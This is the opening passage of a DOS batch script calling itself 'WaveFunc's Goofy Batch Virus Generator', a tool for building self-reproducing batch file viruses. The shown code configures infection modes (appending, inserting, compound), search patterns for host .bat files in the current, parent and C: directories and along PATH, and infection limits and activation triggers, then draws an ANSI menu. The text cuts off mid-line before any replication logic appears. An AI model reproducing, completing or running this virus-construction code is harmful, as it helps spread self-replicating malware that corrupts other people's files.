::
:: Batch Virus Generator by WaveFunc  Version 1.1C
:: Creates User-Defined Reproducing Batch Files
:: Requires DOS 6! also SETINVAR.COM and CONVBAT.EXE
::
:: This batch contains ANSI codes and a few lines that
:: end in spaces (you can't see them but they are vital!)
:: ZIP Then UUE before sending through any email system.
::
@echo off
if '%1=='BvG goto %2
command /e:5000 /c %0 BvG shell
if exist temp$.bat del temp$.bat
goto end
:shell
:: set these to your favorite programs...
set listprg=SHOW
set editprg=EDIT
:: Yes to use ANSI (if available), No to ignore
set useansi=Yes
:: check memory for ANSI...
:: (it works now...)
if not %useansi%==Yes goto noacheck
mem /c|find "ANSI">nul
if errorlevel 1 set useansi=No
:noacheck
:: Yes if ANSI art has multiparts, No if not...
set multians=Yes
:: Keystrings in the parts
set part1=ApPe
set part2=InSe
set part3=CoM1
set part4=CoM2
:: idiot check
echo.|setinvar temp$.bat>nul
if not exist temp$.bat echo No SETINVAR.COM file!
if not exist temp$.bat goto end
:: defaults NOTE! crashes if data is even slightly incorrect! 
:: type.. 1-appending, 2-prepending,
:: 3-compound vir 1st, 4-compound host 1st
set type=3
:: default search method (search variable set by menu section)
set srch=111
:: findhost.. if Yes finds host along path
set findhost=Yes
:: makecopy.. if Yes uses a hidden file
set makecopy=No
:: limits - specify by number of 1's
set seeks=11111111
set infect=11
:: activations...
set actfile=
set time1=
set time2=
set date1=
set date2=
:: name for cfg and batvir files...
set virname=virus
:: key string for the virus...
set key=ViRuS
:: variables for interface
set space=
set space1=
:: 12 spaces...
if %useansi%==Yes set space=            
:: 24 spaces...
if %useansi%==Yes set space1=                        
:: must be 1 more than max search patterns
set maxsrch=11111111
:: max counts (1 over)
set maxseeks=1111111111111111111111111
set maxinfect=111111111

:loadcfg
if not exist %virname%.cfg goto menuclr
copy %virname%.cfg temp$.bat>nul
call temp$.bat

:menuclr
if not %useansi%==Yes goto menu
if not exist bvgen.ans goto menuc1
if not %multians%==Yes goto menuc2
::set anskey=%%part%type%%%
if %type%==1 set anskey=%part1%
if %type%==2 set anskey=%part2%
if %type%==3 set anskey=%part3%
if %type%==4 set anskey=%part4%
find "%anskey%"<bvgen.ans
goto menu
:menuc2
type bvgen.ans
goto menu
:menuc1
echo [1;37;44m
cls

:menu
if exist temp$.bat del temp$.bat
:: take power of search away from user - limit choices
if '%srch%==' set search=. .. %%path%%
if '%srch%=='1 set search=.. . %%path%%
if '%srch%=='11 set search=. %%path%%
if '%srch%=='111 set search=*.bat
if '%srch%=='1111 set search=*.bat ..\*.bat
if '%srch%=='11111 set search=..\*.bat *.bat
if '%srch%=='111111 set search=*.bat ..\*.bat c:*.bat
if '%srch%=='1111111 set search=..\*.bat c:*.bat *.bat
::if '%search%==' set search=. .. %%path%%

if %type%==1 if %makecopy%==No set makecopy=Yes
if %type%==1 if %findhost%==Yes set findhost=No
if '%key%==' set key=ViRuS
if '%virname%==' set virname=virus

if %useansi%==Yes echo [1;37;44m[H
if not %useansi%==Yes cls
if not %useansi%==Yes echo.
echo  WaveFunc's Goofy Batch Virus Generator
echo  ======================================
if %type%==1 echo  A  Virus Type:      appending
if %type%==2 echo  A  Virus Type:      inserting
if %type%==3 echo  A  Virus Type:      compound (virus-host)
if %type%==4 echo  A  Virus Type:      compound (host-virus)
echo  B  Name for files:  %virname%
echo  C  Key string:      %key%
e